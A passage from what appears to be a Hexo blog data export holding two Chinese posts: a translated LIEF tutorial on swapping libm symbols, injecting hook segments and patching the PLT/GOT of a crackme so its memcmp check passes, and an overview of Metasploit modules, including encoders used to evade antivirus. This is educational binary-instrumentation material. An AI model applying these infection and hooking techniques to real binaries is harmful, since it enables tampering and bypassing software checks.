= symbol_a.name</div><div class=\"line\">    symbol_a.name = b_name</div><div class=\"line\"></div><div class=\"line\">hashme_pow_sym = next(filter(<span class=\"keyword\">lambda</span> e : e.name == <span class=\"string\">\"pow\"</span>, my_binary.imported_symbols))</div><div class=\"line\">hashme_log_sym = next(filter(<span class=\"keyword\">lambda</span> e : e.name == <span class=\"string\">\"log\"</span>, my_binary.imported_symbols))</div><div class=\"line\"></div><div class=\"line\">hashme_pow_sym.name = <span class=\"string\">\"cos\"</span></div><div class=\"line\">hashme_log_sym.name = <span class=\"string\">\"sin\"</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">swap(libm, <span class=\"string\">\"log\"</span>, <span class=\"string\">\"sin\"</span>)</div><div class=\"line\">swap(libm, <span class=\"string\">\"pow\"</span>, <span class=\"string\">\"cos\"</span>)</div><div class=\"line\"></div><div class=\"line\">hashme.write(<span class=\"string\">\"hashme.obf\"</span>)</div><div class=\"line\">libm.write(<span class=\"string\">\"libm.so.6\"</span>)</div></pre></td></tr></table></figure>\n<p><img src=\"/2017/12/13/LIEF部分中文文档/2.png\" alt=\"\"><br>有了这个脚本，我们<code>libm</code>在当前目录下建立了一个修改，我们必须强制Linux加载器在执行时使用这个<code>binary.obf</code>。为此，我们export环境变量LD_LIBRARY_PATH到当前目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ LD_LIBRARY_PATH=. hashme.obf 123</div><div class=\"line\">228886645.836282</div></pre></td></tr></table></figure>\n<p>如果我们忽略它，它会使用默认<code>libm</code>和哈希计算完成<code>sin</code>和<code>cos</code>：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ hashme.obf 123</div><div class=\"line\">-0.557978</div></pre></td></tr></table></figure>\n<p>一个真正的用例可能是在像OpenSSL这样的密码库中交换符号。例如<code>EVP_DecryptInit</code>，<code>EVP_EncryptInit</code>有相同的原型，所以我们可以交换它们。</p>\n<h2 id=\"ELF挂钩\"><a href=\"#ELF挂钩\" class=\"headerlink\" title=\"ELF挂钩\"></a>ELF挂钩</h2><p>本教程的目标是钩住一个库函数<br>在前面的教程中，我们看到了如何从共享库中交换符号名称，现在我们将看到在共享库中挂钩函数的机制。</p>\n<p>目标库是标准的数学库(<code>libm.so</code>)，我们将在exp函数中插入一个钩子，使得(exp(x)= x + 1)。下面的清单给出了使用这个函数的样例的源代码：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;math.h&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> **argv)</span> </span>&#123;</div><div class=\"line\">  <span class=\"keyword\">if</span> (argc != <span class=\"number\">2</span>) &#123;</div><div class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Usage: %s &lt;a&gt; \\n\"</span>, argv[<span class=\"number\">0</span>]);</div><div class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</div><div class=\"line\">  &#125;</div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">int</span> a = atoi(argv[<span class=\"number\">1</span>]);</div><div class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"exp(%d) = %f\\n\"</span>, a, <span class=\"built_in\">exp</span>(a));</div><div class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>挂钩功能如下:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">double</span> <span class=\"title\">hook</span><span class=\"params\">(<span class=\"keyword\">double</span> x)</span> </span>&#123;</div><div class=\"line\">  <span class=\"keyword\">return</span> x + <span class=\"number\">1</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>编译<code>gcc -Os -nostdlib -nodefaultlibs -fPIC -Wl,-shared hook.c -o hook</code></p>\n<p>为了将这个钩子注入到库中，我们使用add()(段)方法</p>\n<p><code>Binary.add(*args, **kwargs)</code></p>\n<p>重载函数</p>\n<p>1.add(self: _pylief.ELF.Binary, arg0: LIEF::ELF::DynamicEntry) -&gt; LIEF::ELF::DynamicEntry</p>\n<p>dynamic_entry</p>\n<p>2.add(self: _pylief.ELF.Binary, section: LIEF::ELF::Section, loaded: bool=True) -&gt; LIEF::ELF::Section</p>\n<p>将给的<code>Section</code>添加到二进制文件中。<br>如果该部分不应加载到内存中，loaded参数必须设置为False（默认值：True）</p>\n<p>3.add（self:_pylief.ELF.Binary, segment:LIEF::ELF::Segment, base:int = 0）-&gt; LIEF::ELF::Segment</p>\n<p>在二进制文件中添加一个段</p>\n<p>4.add(self: _pylief.ELF.Binary, note: LIEF::ELF::Note) -&gt; LIEF::ELF::Note</p>\n<p>在二进制文件中添加一个行的<code>Note</code>一旦stub被注入，我们只需要改变exp符号的地址：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">exp_symbol  = libm.get_symbol(<span class=\"string\">\"exp\"</span>)</div><div class=\"line\">hook_symbol = hook.get_symbol(<span class=\"string\">\"hook\"</span>)</div><div class=\"line\"></div><div class=\"line\">exp_symbol.value = segment_added.virtual_address + hook_symbol.value</div></pre></td></tr></table></figure>\n<p>测试修补过的库：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">./do_math.bin 1</div><div class=\"line\">exp(1) = 2.718282</div><div class=\"line\">LD_LIBRARY_PATH=. ./do_math.bin 1</div><div class=\"line\">exp(1) = 2.000000</div></pre></td></tr></table></figure>\n<h2 id=\"感染plt-got\"><a href=\"#感染plt-got\" class=\"headerlink\" title=\"感染plt / got\"></a>感染plt / got</h2><p>本教程的目标是在ELF二进制文件中挂接导入的函数。<br>通过感染<code>.got</code>部分挂钩导入的函数是一个众所周知的技术，本教程将重点介绍使用LIEF的实现。</p>\n<p>这些数字说明了这个plt/got机制：<br><img src=\"/2017/12/13/LIEF部分中文文档/3.png\" alt=\"\"><br>使用延迟绑定，第一次调用该函数时，该<code>got</code>条目将重定向到plt指令。<br><img src=\"/2017/12/13/LIEF部分中文文档/4.png\" alt=\"\"><br>第二次，<code>got</code>条目在共享库中保存地址<br>基本上感染分两步完成：</p>\n<ul>\n<li>首先，我们注入我们的钩子</li>\n<li>其次，我们通过打补丁将目标函数重定向到我们的钩子<code>got</code></li>\n</ul>\n<p>可以用下图来总结：<br><img src=\"/2017/12/13/LIEF部分中文文档/5.png\" alt=\"\"><br>作为例子，我们将使用一个基本的crackme在<code>memcmp</code>上的Flag和用户的输入。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#include &lt;stdio.h&gt;</span></div><div class=\"line\"><span class=\"comment\">#include &lt;stdlib.h&gt;</span></div><div class=\"line\"><span class=\"comment\">#include &lt;string.h&gt;</span></div><div class=\"line\"></div><div class=\"line\">// Damn_YoU_Got_The_Flag</div><div class=\"line\">char password[] = <span class=\"string\">\"\\x18\\x3d\\x31\\x32\\x03\\x05\\x33\\x09\\x03\\x1b\\x33\\x28\\x03\\x08\\x34\\x39\\x03\\x1a\\x30\\x3d\\x3b\"</span>;</div><div class=\"line\"></div><div class=\"line\">inline int check(char* input);</div><div class=\"line\"></div><div class=\"line\">int check(char* input) &#123;</div><div class=\"line\">  <span class=\"keyword\">for</span> (int i = <span class=\"number\">0</span>; i &lt; sizeof(password) - <span class=\"number\">1</span>; ++i) &#123;</div><div class=\"line\">    password[i] ^= <span class=\"number\">0x5c</span>;</div><div class=\"line\">  &#125;</div><div class=\"line\">  <span class=\"keyword\">return</span> memcmp(password, input, sizeof(password) - <span class=\"number\">1</span>);</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\">int main(int argc, char **argv) &#123;</div><div class=\"line\">  <span class=\"keyword\">if</span> (argc != <span class=\"number\">2</span>) &#123;</div><div class=\"line\">    printf(<span class=\"string\">\"Usage: %s &lt;password&gt;\\n\"</span>, argv[<span class=\"number\">0</span>]);</div><div class=\"line\">    <span class=\"keyword\">return</span> EXIT_FAILURE;</div><div class=\"line\">  &#125;</div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">if</span> (strlen(argv[<span class=\"number\">1</span>]) == (sizeof(password) - <span class=\"number\">1</span>) &amp;&amp; check(argv[<span class=\"number\">1</span>]) == <span class=\"number\">0</span>) &#123;</div><div class=\"line\">    puts(<span class=\"string\">\"You got it !!\"</span>);</div><div class=\"line\">    <span class=\"keyword\">return</span> EXIT_SUCCESS;</div><div class=\"line\">  &#125;</div><div class=\"line\"></div><div class=\"line\">  puts(<span class=\"string\">\"Wrong\"</span>);</div><div class=\"line\">  <span class=\"keyword\">return</span> EXIT_FAILURE;</div><div class=\"line\"></div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>这个Flag的值和<code>0x5c</code>进行了<code>xor</code>操作，为了验证crackme，用户必须输入<code>Damn_YoU_Got_The_Flag</code>:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ crackme.bin foo</div><div class=\"line\">Wrong</div><div class=\"line\">$ crackme.bin Damn_YoU_Got_The_Flag</div><div class=\"line\">You got it !!</div></pre></td></tr></table></figure>\n<p>挂钩将包含打印参数<code>memcmp</code>并返回0：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"arch/x86_64/syscall.c\"</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> stdout 1</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">my_memcmp</span><span class=\"params\">(<span class=\"keyword\">const</span> <span class=\"keyword\">void</span>* lhs, <span class=\"keyword\">const</span> <span class=\"keyword\">void</span>* rhs, <span class=\"keyword\">int</span> n)</span> </span>&#123;</div><div class=\"line\">  <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> msg[] = <span class=\"string\">\"Hook memcmp\\n\"</span>;</div><div class=\"line\">  _write(<span class=\"built_in\">stdout</span>, msg, <span class=\"keyword\">sizeof</span>(msg));</div><div class=\"line\">  _write(<span class=\"built_in\">stdout</span>, (<span class=\"keyword\">const</span> <span class=\"keyword\">char</span>*)lhs, n);</div><div class=\"line\">  _write(<span class=\"built_in\">stdout</span>, <span class=\"string\">\"\\n\"</span>, <span class=\"number\">2</span>);</div><div class=\"line\">  _write(<span class=\"built_in\">stdout</span>, (<span class=\"keyword\">const</span> <span class=\"keyword\">char</span>*)rhs, n);</div><div class=\"line\">  _write(<span class=\"built_in\">stdout</span>, <span class=\"string\">\"\\n\"</span>, <span class=\"number\">2</span>);</div><div class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>由于钩子将被注入Creakme，因此它必须具备以下要求：</p>\n<ul>\n<li>汇编代码必须是位置独立的(使用<code>-fPIC</code>或<code>-pie/-fPIE</code>标记编译)</li>\n<li>不要使用外部库比如<code>libc.so</code>(标志)<code>-nostdlib -nodefaultlibs</code>(标志)</li>\n</ul>\n<p>基于要求，这个钩子的编译为：<code>gcc -nostdlib -nodefaultlibs -fPIC -Wl,-shared hook.c -o hook</code></p>\n<h3 id=\"注入钩子\"><a href=\"#注入钩子\" class=\"headerlink\" title=\"注入钩子\"></a>注入钩子</h3><p>第一步是将钩子注入bin。为此我们将添加一个<code>Segment</code>:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">import</span> lief</div><div class=\"line\"></div><div class=\"line\">crackme = lief.parse(<span class=\"string\">\"crackme.bin\"</span>)</div><div class=\"line\">hook    = lief.parse(<span class=\"string\">\"hook\"</span>)</div><div class=\"line\"></div><div class=\"line\">segment_added  = crackme.add(hook.segments[<span class=\"number\">0</span>])</div></pre></td></tr></table></figure>\n<p>钩子的所有汇编代码都存在<code>hook</code>的第一段的<code>LOAD</code>中。<br>一旦钩子被添加，钩子的虚拟地址是<code>segment_added</code>的虚拟地址<code>virtual_address</code>,然后我们进行<code>got</code>patch。</p>\n<h3 id=\"Patching-got\"><a href=\"#Patching-got\" class=\"headerlink\" title=\"Patching got\"></a>Patching <code>got</code></h3><p>LIEF提供了一个功能，可以轻松修补<code>got</code>与<code>Symbol</code>相关的条目：</p>\n<p><code>Binary.patch_pltgot（* args，** kwargs ）</code></p>\n<p>重载函数<br>1.patch_pltgot(self: _pylief.ELF.Binary, symbol_name: str, address: int) -&gt; None</p>\n<p>用导入的符号名称Patch <code>address</code></p>\n<p>2.patch_pltgot(self: _pylief.ELF.Binary, symbol: LIEF::ELF::Symbol, address: int) -&gt; None</p>\n<p>Patch导入的<code>Symbol</code>和<code>address</code></p>\n<p><code>memcmp</code>函数的偏移量存储在value关联的动态符号的属性中。因此，它的虚拟地址将是：</p>\n<ul>\n<li><code>my_memcpy</code>= <code>value</code> + <code>segment_added.virtual_address</code></li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">my_memcmp      = hook.get_symbol(<span class=\"string\">\"my_memcmp\"</span>)</div><div class=\"line\">my_memcmp_addr = segment_added.virtual_address + my_memcmp.value</div></pre></td></tr></table></figure>\n<p>最后我们可以用<code>memcmp</code>的值来patch这个crackme.</p>\n<p><code>crackme.patch_pltgot(&#39;memcmp&#39;, my_memcmp_addr)</code></p>\n<p>最后rebuild</p>\n<p><code>crackme.write(&quot;crackme.hooked&quot;)</code></p>\n<h3 id=\"运行\"><a href=\"#运行\" class=\"headerlink\" title=\"运行\"></a>运行</h3><p>由于在检查标志值之前检查输入大小，我们必须提供正确长度的输入（不管其内容）：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ crackme.hooked XXXXXXXXXXXXXXXXXXXXX</div><div class=\"line\">Hook add</div><div class=\"line\">Damn_YoU_Got_The_Flag</div><div class=\"line\">XXXXXXXXXXXXXXXXXXXXX</div><div class=\"line\">You got it !!</div></pre></td></tr></table></figure>"},{"title":"Metasploit learning","date":"2017-05-09T04:14:44.000Z","_content":"\n## 体系框架\n\n![框架](Metasploit-learning/m.png)\n\n## 模块\n\n[不错的介绍文章](http://1x0.xyz/archives/whatismetasploit.html)\n\nMetasploit框架的核心，通过多个模块的组装，完成渗透攻击中各个阶段的不同功能。\n\n在metasploit中溢出模块(Exploit)共分为13种，分别是：ais、bsdi、dialup、freebsd、hpux、irix、linux、multi、netware、osx、solaris、unix、windows。其中windows下面的最多。\n\n辅助（Auxiliary）模块共分为13种，分别是admin、client、crawler、dos、fuzzers、gather、pdf、scanner、server、sniffer、spoof、sqli、voip。\n\n加载(payload)模块共分为13种，分别是aix、bsd、bsdi、cmd、generic、java、linux、netware、osx、php、solaris、tty、windows。\n\n### 辅助模块 AUX\n\n主要是渗透测试的信息收集环节，进而帮助攻击者完成更精确的攻击。\n同时还包含一些无需加载攻击载荷，但往往不是为了取得目标系统的权限，比如拒绝服务攻击。\n\n### 渗透攻击模块 Exploit\n\n核心功能，又分为主动攻击模块和被动攻击模块，目的是为了获得目标组件的一定的访问权限。\n攻击模块又分为多个不同的类别，囊括了主流操作系统和一些分支操作系统。\n\n### 攻击载荷模块 Payloads\n\n具体的完成指定任务的代码，包括**独立**， **传输器**，**传输体**，三种不同的类型。\n\n### 空指令模块 Nops\n\n主要是用来在执行的shellcode前添加添加一大块nop，用来攻击内存随机化，地址偏移等情况。\n\n### 编码器模块 Encoders\n\n通过一定的编码来去掉“坏字符”，和绕过一定的安全防御软件，实现免杀。\n同时注意可能会出现找不到合适的payload的情况。\n\n### 后渗透攻击模块 Post\n\n主要用于攻击成功后的工作。比如：内网攻击，本地提权，敏感信息获取等。\nMetasploit中的后渗透攻击模块的名字成为Meterpretr。\n\n## 基本攻击\n\n[简洁而基础的一篇文章](http://lmwen.top/2016/08/06/metasploit%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/)\n\n## 常用命令\n\n[metasploit终端命令大全 MSF](https://www.i0day.com/1182.html)\n\n## 关于批量化\n\nmsfcli已经不再使用，取而代之的是`msfconsole -x`。同时，使用`mafconsole -r` 可以加载脚本来使用msf。\n\n## 一些小坑\n\n1. msf的更新和安装方式是相关的。在kali上只能用apt-get的方式更新，如果是git得到，可以使用`msfupdate`。如果在kali上用`msfupdate`可能会遇到未知错误。\n\n2. `Failed to connect to the database: could not connect to server: Connection refused`遇到注重错误一般是`postgresql`服务没开，按照[官方回答](https://community.rapid7.com/thread/9302)修改即可。\n","source":"_posts/Metasploit-learning.md","raw":"---\ntitle: Metasploit learning\ntags:\n  - Metasploit\ncategories: []\ndate: 2017-05-09 12:14:44\n---\n\n## 体系框架\n\n![框架](Metasploit-learning/m.png)\n\n## 模块\n\n[不错的介绍文章](http://1x0.xyz/archives/whatismetasploit.html)\n\nMetasploit框架的核心，通过多个模块的组装，完成渗透攻击中各个阶段的不同功能。\n\n在metasploit中溢出模块(Exploit)共分为13种，分别是：ais、bsdi、dialup、freebsd、hpux、irix、linux、multi、netware、osx、solaris、unix、windows。其中windows下面的最多。\n\n辅助（Auxiliary）模块共分为13种，分别是admin、client、crawler、dos、fuzzers、gather、pdf、scanner、server、sniffer、spoof、sqli、voip。\n\n加载(payload)模块共分为13种，分别是aix、bsd、bsdi、cmd、generic、java、linux、netware、osx、php、solaris、tty、windows。\n\n### 辅助模块 AUX\n\n主要是渗透测试的信息收集环节，进而帮助攻击者完成更精确的攻击。\n同时还包含一些无需加载攻击载荷，但往往不是为了取得目标系统的权限，比如拒绝服务攻击。\n\n### 渗透攻击模块 Exploit\n\n核心功能，又分为主动攻击模块和被动攻击模块，目的是为了获得目标组件的一定的访问权限。\n攻击模块又分为多个不同的类别，囊括了主流操作系统和一些分支操作系统。\n\n### 攻击载荷模块 Payloads\n\n具体的完成指定任务的代码，包括**独立**， **传输器**，**传输体**，三种不同的类型。\n\n### 空指令模块 Nops\n\n主要是用来在执行的shellcode前添加添加一大块nop，用来攻击内存随机化，地址偏移等情况。\n\n### 编码器模块 Encoders\n\n通过一定的编码来去掉“坏字符”，和绕过一定的安全防御软件，实现免杀。\n同时注意可能会出现找不到合适的payload的情况。\n\n### 后渗透攻击模块 Post\n\n主要用于攻击成功后的工作。比如：内网攻击，本地提权，敏感信息获取等。\nMetasploit中的后渗透攻击模块的名字成为Meterpretr。\n\n## 基本攻击\n\n[简洁而基础的一篇文章](http://lmwen.top/2016/08/06/metasploit%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/)\n\n## 常用命令\n\n[metasploit终端命令大全 MSF](https://www.i0day.com/1182.html)\n\n## 关于批量化\n\nmsfcli已经不再使用，取而代之的是`msfconsole -x`。同时，使用`mafconsole -r` 可以加载脚本来使用msf。\n\n## 一些小坑\n\n1. msf的更新和安装方式是相关的。在kali上只能用apt-get的方式更新，如果是git得到，可以使用`msfupdate`。如果在kali上用`msfupdate`可能会遇到未知错误。\n\n2. `Failed to connect to the database: could not connect to server: Connection refused`遇到注重错误一般是`postgresql`服务没开，按照[官方回答](https://community.rapid7.com/thread/9302)修改即可。\n","slug":"Metasploit-learning","published":1,"updated":"2017-06-06T07:36:40.954Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0jz9001khv18n01tbgcr","content":"<h2 id=\"体系框架\"><a href=\"#体系框架\" class=\"headerlink\" title=\"体系框架\"></a>体系框架</h2><p><img src=\"/2017/05/09/Metasploit-learning/m.png\" alt=\"框架\"></p>\n<h2 id=\"模块\"><a href=\"#模块\" class=\"headerlink\" title=\"模块\"></a>模块</h2><p><a href=\"http://1x0.xyz/archives/whatismetasploit.html\" target=\"_blank\" rel=\"external\">不错的介绍文章</a></p>\n<p>Metasploit框架的核心，通过多个模块的组装，完成渗透攻击中各个阶段的不同功能。</p>\n<p>在metasploit中溢出模块(Exploit)共分为13种，分别是：ais、bsdi、dialup、freebsd、hpux、irix、linux、multi、netware、osx、solaris、unix、windows。其中windows下面的最多。</p>\n<p>辅助（Auxiliary）模块共分为13种，分别是admin、client、crawler、dos、fuzzers、gather、pdf、scanner、server、sniffer、spoof、sqli、voip。</p>\n<p>加载(payload)模块共分为13种，分别是aix、bsd、bsdi、cmd、generic、java、linux、netware、osx、php、solaris、tty、windows。</p>\n<h3 id=\"辅助模块-AUX\"><a href=\"#辅助模块-AUX\" class=\"headerlink\" title=\"辅助模块 AUX\"></a>辅助模块 AUX</h3><p>主要是渗透测试的信息收集环节，进而帮助攻击者完成更精确的攻击。<br>同时还包含一些无需加载攻击载荷，但往往不是为了取得目标系统的权限，比如拒绝服务攻击。</p>\n<h3 id=\"渗透攻击模块-Exploit\"><a href=\"#渗透攻击模块-Exploit\" class=\"headerlink\" title=\"渗透攻击模块 Exploit\"></a>渗透攻击模块 Exploit</h3><p>核心功能，又分为主动攻击模块和被动攻击模块，目的是为了获得目标组件的一定的访问权限。<br>攻击模块又分为多个不同的类别，囊括了主流操作系统和一些分支操作系统。</p>\n<h3 id=\"攻击载荷模块-Payloads\"><a href=\"#攻击载荷模块-Payloads\" class=\"headerlink\" title=\"攻击载荷模块 Payloads\"></a>攻击载荷模块 Payloads</h3><p>具体的完成指定任务的代码，包括<strong>独立</strong>， <strong>传输器</strong>，<strong>传输体</strong>，三种不同的类型。</p>\n<h3 id=\"空指令模块-Nops\"><a href=\"#空指令模块-Nops\" class=\"headerlink\" title=\"空指令模块 Nops\"></a>空指令模块 Nops</h3><p>主要是用来在执行的shellcode前添加添加一大块nop，用来攻击内存随机化，地址偏移等情况。</p>\n<h3 id=\"编码器模块-Encoders\"><a href=\"#编码器模块-Encoders\" class=\"headerlink\" title=\"编码器模块 Encoders\"></a>编码器模块 Encoders</h3><p>通过一定的编码来去掉“坏字符”，和绕过一定的安全防御软件，实现免杀。<br>同时注意可能会出现找不到合适的payload的情况。</p>\n<h3 id=\"后渗透攻击模块-Post\"><a href=\"#后渗透攻击模块-Post\" class=\"headerlink\" title=\"后渗透攻击模块 Post\"></a>后渗透攻击模块 Post</h3><p>主要用于攻击成功后的工作。比如：内网攻击，本地提权，敏感信息获取等。<br>Metasploit中的后渗透攻击模块的名字成为Meterpretr。</p>\n<h2 id=\"基本攻击\"><a href=\"#基本攻击\" class=\"headerlink\" title=\"基本攻击\"></a>基本攻击</h2><p><a href=\"http://lmwen.top/2016/08/06/metasploit%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/\" target=\"_blank\" rel=\"external\">简洁而基础的一篇文章</a></p>\n<h2 id=\"常用命令\"><a href=\"#常用命令\" class=\"headerlink\" title=\"常用命令\"></a>常用命令</h2><p><a href=\"https://www.i0day.com/1182.html\" target=\"_blank\" rel=\"external\">metasploit终端命令大全 MSF</a></p>\n<h2 id=\"关于批量化\"><a href=\"#关于批量化\" class=\"headerlink\" title=\"关于批量化\"></a>关于批量化</h2><p>msfcli已经不再使用，取而代之的是<code>msfconsole -x</code>。同时，使用<code>mafconsole -r</code> 可以加载脚本来使用msf。</p>\n<h2 id=\"一些小坑\"><a href=\"#一些小坑\" class=\"headerlink\" title=\"一些小坑\"></a>一些小坑</h2><ol>\n<li><p>msf的更新和安装方式是相关的。在kali上只能用apt-get的方式更新，如果是git得到，可以使用<code>msfupdate</code>。如果在kali上用<code>msfupdate</code>可能会遇到未知错误。</p>\n</li>\n<li><p><code>Failed to connect to the database: could not connect to server: Connection refused</code>遇到注重错误一般是<code>postgresql</code>服务没开，按照<a href=\"https://community.rapid7.com/thread/9302\" target=\"_blank\" rel=\"external\">官方回答</a>修改即可。</p>\n</li>\n</ol>\n","excerpt":"","more":"<h2 id=\"体系框架\"><a href=\"#体系框架\" class=\"headerlink\" title=\"体系框架\"></a>体系框架</h2><p><img src=\"/2017/05/09/Metasploit-learning/m.png\" alt=\"框架\"></p>\n<h2 id=\"模块\"><a href=\"#模块\" class=\"headerlink\" title=\"模块\"></a>模块</h2><p><a href=\"http://1x0.xyz/archives/whatismetasploit.html\">不错的介绍文章</a></p>\n<p>Metasploit框架的核心，通过多个模块的组装，完成渗透攻击中各个阶段的不同功能。</p>\n<p>在metasploit中溢出模块(Exploit)共分为13种，分别是：ais、bsdi、dialup、freebsd、hpux、irix、linux、multi、netware、osx、solaris、unix、windows。其中windows下面的最多。</p>\n<p>辅助（Auxiliary）模块共分为13种，分别是admin、client、crawler、dos、fuzzers、gather、pdf、scanner、server、sniffer、spoof、sqli、voip。</p>\n<p>加载(payload)模块共分为13种，分别是aix、bsd、bsdi、cmd、generic、java、linux、netware、osx、php、solaris、tty、windows。</p>\n<h3 id=\"辅助模块-AUX\"><a href=\"#辅助模块-AUX\" class=\"headerlink\" title=\"辅助模块 AUX\"></a>辅助模块 AUX</h3><p>主要是渗透测试的信息收集环节，进而帮助攻击者完成更精确的攻击。<br>同时还包含一些无需加载攻击载荷，但往往不是为了取得目标系统的权限，比如拒绝服务攻击。</p>\n<h3 id=\"渗透攻击模块-Exploit\"><a href=\"#渗透攻击模块-Exploit\" class=\"headerlink\" title=\"渗透攻击模块 Exploit\"></a>渗透攻击模块 Exploit</h3><p>核心功能，又分为主动攻击模块和被动攻击模块，目的是为了获得目标组件的一定的访问权限。<br>攻击模块又分为多个不同的类别，囊括了主流操作系统和一些分支操作系统。</p>\n<h3 id=\"攻击载荷模块-Payloads\"><a href=\"#攻击载荷模块-Payloads\" class=\"headerlink\" title=\"攻击载荷模块 Payloads\"></a>攻击载荷模块 Payloads</h3><p>具体的完成指定任务的代码，包括<strong>独立</strong>， <strong>传输器</strong>，<strong>传输体</strong>，三种不同的类型。</p>\n<h3 id=\"空指令模块-Nops\"><a href=\"#空指令模块-Nops\" class=\"headerlink\" title=\"空指令模块 Nops\"></a>空指令模块 Nops</h3><p>主要是用来在执行的shellcode前添加添加一大块nop，用来攻击内存随机化，地址偏移等情况。</p>\n<h3 id=\"编码器模块-Encoders\"><a href=\"#编码器模块-Encoders\" class=\"headerlink\" title=\"编码器模块 Encoders\"></a>编码器模块 Encoders</h3><p>通过一定的编码来去掉“坏字符”，和绕过一定的安全防御软件，实现免杀。<br>同时注意可能会出现找不到合适的payload的情况。</p>\n<h3 id=\"后渗透攻击模块-Post\"><a href=\"#后渗透攻击模块-Post\" class=\"headerlink\" title=\"后渗透攻击模块 Post\"></a>后渗透攻击模块 